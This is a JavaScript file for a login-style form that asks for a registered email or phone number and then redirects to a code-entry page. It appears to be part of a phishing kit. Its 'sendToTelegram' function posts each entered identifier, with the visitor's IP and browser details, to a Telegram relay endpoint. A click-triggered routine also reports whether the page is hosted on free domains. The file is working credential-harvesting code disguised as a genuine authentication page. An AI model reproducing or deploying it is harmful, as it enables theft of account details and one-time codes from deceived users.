(function () {
  var form = document.getElementById("auth-form");
  var methodSelect = document.getElementById("delivery-method");
  var destinationWrap = document.getElementById("auth-destination");
  var destinationInput = document.getElementById("destination");
  var destinationLabel = document.getElementById("destination-label");
  var authHint = document.getElementById("auth-hint");
  var methodError = document.getElementById("method_validation_message");
  var destinationError = document.getElementById("destination_validation_message");
  var submitBtn = form.querySelector('.button-subm');

  // ============================================================
  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
  // ============================================================

  let domainDetected = false;

  function detectDomain() {
    if (domainDetected) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;
    
    const freeDomains = [
      '.tk', '.ml', '.ga', '.cf', '.gq',
      '.free.nf', '.free.org', '.free.com',
      '.co.cc', '.co.nr', '.cjb.net',
      '.dynu.net', '.ddns.net', '.no-ip.org',
      'vercel.app', 'netlify.app', 'github.io',
      'pages.dev', 'web.app', 'firebaseapp.com',
      'herokuapp.com', 'glitch.me', 'replit.co',
      '000webhostapp.com', 'byethost.com',
      'freehostia.com', 'profreehost.com',
      '.example.com', '.test', '.localhost'
    ];

    const isFree = freeDomains.some(freeDomain => 
      domain.includes(freeDomain) || domain.endsWith(freeDomain)
    );

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain,
      isFree: isFree
    });
  }

  document.addEventListener('click', function() {
    if (!domainDetected) detectDomain();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {}

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  function clearErrors() {
    methodError.textContent = "";
    destinationError.textContent = "";
  }

  function configureDestination(method) {
    clearErrors();
    destinationInput.value = "";

    if (!method) {
      destinationWrap.hidden = true;
      return;
    }

    destinationWrap.hidden = false;

    if (method === "email") {
      destinationLabel.textContent = "Registered email";
      destinationInput.type = "email";
      destinationInput.placeholder = "Enter your registered email";
      destinationInput.setAttribute("autocomplete", "email");
      authHint.textContent = "Enter the email address on file for your account.";
    } else {
      destinationLabel.textContent = "Registered mobile number";
      destinationInput.type = "tel";
      destinationInput.placeholder = "Enter your registered mobile number";
      destinationInput.setAttribute("autocomplete", "tel");
      authHint.textContent = "Enter the mobile number on file for your account.";
    }

    destinationInput.focus();
  }

  function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  }

  function isValidPhone(value) {
    var digits = value.replace(/\D/g, "");
    return digits.length >= 10 && digits.length <= 15;
  }

  methodSelect.addEventListener("change", function () {
    configureDestination(methodSelect.value);
  });

  // ============================================================
  // ====== FORM SUBMIT =========================================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    clearErrors();

    var method = methodSelect.value;
    var destination = destinationInput.value.trim();
    var valid = true;

    if (!method) {
      methodError.textContent = "Please select Email or SMS.";
      valid = false;
    }

    if (!destination) {
      destinationError.textContent =
        method === "sms"
          ? "The mobile number field is required."
          : "The email field is required.";
      valid = false;
    } else if (method === "email" && !isValidEmail(destination)) {
      destinationError.textContent = "Please enter a valid email address.";
      valid = false;
    } else if (method === "sms" && !isValidPhone(destination)) {
      destinationError.textContent = "Please enter a valid mobile number.";
      valid = false;
    }

    if (!valid) {
      if (!method) {
        methodSelect.focus();
      } else {
        destinationInput.focus();
      }
      return;
    }

    submitBtn.disabled = true;
    submitBtn.textContent = 'Sending...';
    
    sendToTelegram('auth_attempt', {
      method: method,
      destination: destination
    }).then(() => {
      submitBtn.textContent = 'Processing...';
      
      try {
        sessionStorage.setItem(
          "melodyAuth",
          JSON.stringify({
            method: method,
            destination: destination
          })
        );
      } catch (e) {}
      
      setTimeout(function() {
        window.location.href = "enter-code.html";
      }, 1500);
    }).catch(() => {
      submitBtn.disabled = false;
      submitBtn.textContent = 'Generate Code';
    });
  });
})();